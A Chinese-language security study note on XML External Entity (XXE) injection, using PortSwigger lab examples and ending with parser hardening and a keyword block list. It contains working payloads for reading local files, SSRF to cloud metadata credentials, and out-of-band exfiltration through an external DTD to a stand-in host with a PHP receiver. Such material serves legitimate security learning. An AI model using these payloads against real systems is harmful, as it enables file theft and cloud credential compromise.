---
title: XXE
date: 2024-06-06
tags:
  - 基础漏洞
categories:
  - 安全相关
---
XXE（XML External Entity Injection），xml 外部实体注入漏洞；其发生在应用程序解析 XML 输入时，没禁止外部实体的加载，导致用户可以控制外部加载的文件，造成文件读取、命令执行、内网扫描、攻击内网等危害；

## 探测位置

数据包的测试、功能点的测试

- 获取到 Content-Type 或数据类型为 xml 时，尝试 xml 语言 payload 进行测试；或是不论是否为 xml ，都将他修改为 xml 来测试；
- 在文件上传引用插件解析或预览功能处可能会造成文件中 XXE Payload 被执行；

## 示例

（部分内容以 Burp 的靶场为例 https://portswigger.net/web-security/all-labs ）

- 简单的文件读取

传输的数据是格式是 xml 格式，通过修改 xml 中的内容，使其执行实体中的内容从而读取文件；

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```


![[attachments/20250510-1.png]]

- SSRF 及云上元数据

（云上的元数据：描述云资源属性、配置等信息，作为云平台管理和自动化运维的核心，通常以键值对的形式存储；）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> 
]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

（IP 地址是对应云服务器的地址）根据路径读取里面的信息；

![[attachments/20250510-2.png]]

- 利用外部实体 dtd 读取文件

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://test.com/file.dtd">
%file;
]>
<user>
<username>&send;</username>
<password>1</password>
</user>
```

```dtd file:file.dtd
<!ENTITY send SYSTEM "file:///d:/x.txt">
```

- 无回显利用带外进行测试

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://sdjfoaisdnf.dnslog.cn">
%file;
]>
<user>
	<username>&send;</username>
	<password>1</password>
</user>
```

再利用外部引用实体 dtd 配合带外

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///c:/c.txt">
<!ENTITY % remote SYSTEM "http://www.test.com/test.dtd">
%remote;
%all;
]>
<user>
	<username>&send;</username>
	<password>1</password>
</user>
```

```dtd file:test.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://www.test.com/get.php?file=%file;'>">
```

```php file:get.php
<?php
$data=$_GET['file'];
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>
```

通过执行外部实体，`remote -> test.dtd -> all -> send -> get.php?file -> file:///c:/c.txt`，`http://www.test.com/get.php?file=读取的内网数据`，最终生成 `file.txt` 文件中包含读取到的内容；

- 利用报错回显来获取信息

故意构造错误的实体引用，使解析器报错；利用服务器返回详细的错误信息回显获取文件内容；

（类似于 SQL 注入中的报错注入）

```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://test.com/file.dtd"> 
%xxe;
]>
```

```dtd file:file.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

`file:///invalid/%file;` 由于该路径（invalid）无效，解析器报错；

- Xinclude

Xinclude 是 xml 标准，允许在 xml 文档中动态包含外部文件或其他 xml 片段；

示例：

正常提交数据时的格式：`username=1&password=1`；

直接将 username 参数修改为带有 xinclude 语法的 xml 来读取文件内容；

`username=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&password=1`（尝试加载本地文件）

- 文件解析不当

一些文件格式实际上只是 xml 文档的 zip 文件，其是通过 xml 格式来解析存储的；因此可以通过修改其内容来实现 xxe 漏洞；

eg：svg 图片文件，在里面写入这样的内容，以 svg 的格式进行保存，部分网站因其解析读取不当从而触发漏洞；

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![[attachments/20250510-4.png]]

可能存在的功能点：

- 基于 XML 的 Web 服务： SOAP、REST 和 RPC API 这些接收和处理 XML 格式；
- 导入/导出功能： 任何以 XML 格式传输数据的进出口；
- RSS/Atom 订阅处理器： 订阅功能也可能隐藏着 XXE 漏洞；
- 文档查看器/转换器： 处理 DOCX、XLSX 等 XML 格式文档的功能；
- 文件上传处理 XML： 比如 SVG 图像处理器，上传图片；

XML 处理函数 `simplexml_load_string` 用于将 XML 格式的字符串转换为 SimpleXML 对象，从而可以轻松遍历或操作 XML 数据，操作处理不当会导致 XXE 漏洞；

![[attachments/20250510-5.png]]

> 案例：
> 
> https://mp.weixin.qq.com/s/5iPoqsWpYfQmr0ExcJYRwg
> 
> https://xz.aliyun.com/news/16463
> 
> https://mp.weixin.qq.com/s/biQgwMU2v1I92CsDOFRB7g
> 
> https://mp.weixin.qq.com/s/1pj9sbwKT6RjIiLgNC7-Gg
> 
> https://mp.weixin.qq.com/s/Mgd91_Iie-wZU7MqP5oCXw

## 修复与防御

直接禁用外部实体

PHP

```php
libxml_disable_entity_loader(true);
```

Java

```java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
.setFeature("http://xml.org/sax/features/external-general-entities",false)
.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
```

Python

```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

黑名单过滤关键词：`<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC`；

## PS：

### XML

XML 等同于 JSON ，被用来传输和存储数据；其文档结构包括 XML 声明（可选）、DTD 文档类型定义（可选）、文档元素，主要作用是把数据从 HTML 中分离出来，独立于软件和硬件的信息传输工具；

XML 中主要的两种数据类型：（主要区别在于它们如何解析特殊字符）

- PCDATA：会被 XML 解析器解析的文本内容；特殊字符需要转义，如 `&lt;` 代替 `<`；
- CDATA：不会被解析；需使用 `<![CDATA[...]]>` 包裹；

### DTD

Document Type Definition 文档类型定义。用来控制文档的一种格式规范；用来定义 XML 中存在的标签、属性及其他元素里有什么元素；DTD 可以声明在 XML 文档中，也可以作为一个外部引用；

从外部的 dta 文件中引用（xxe 产生的原因）；引用格式：`<!DOCTYPE 根元素 SYSTEM "URL">`

URL 中常见的协议：

![[attachments/20250510.png]]

实体（ENTITY）：类似于定义变量的操作；

|  类型  |               通用实体                |                参数实体                 |
| :--: | :-------------------------------: | :---------------------------------: |
|  内部  |      `<!ENTITY 实体名 "文本内容">`       |       `<!ENTITY % 实体名 "文本内容"`       |
|  外部  | `<!ENTITY 实体名 SYSTEM "外部文件/URL">` | `<!ENTITY % 实体名 SYSTEM "外部文件/URL">` |
| 引用方式 |              `&实体名;`              |               `%实体名;`               |
| 使用场合 |         用在 XML 文档中（包括 DTD）         |           只用在 DTD 的元素和属性声明中           |
 
> [XML 教程](https://www.w3school.com.cn/xml/index.asp)
> 
> [DTD 教程](https://www.w3school.com.cn/dtd/index.asp)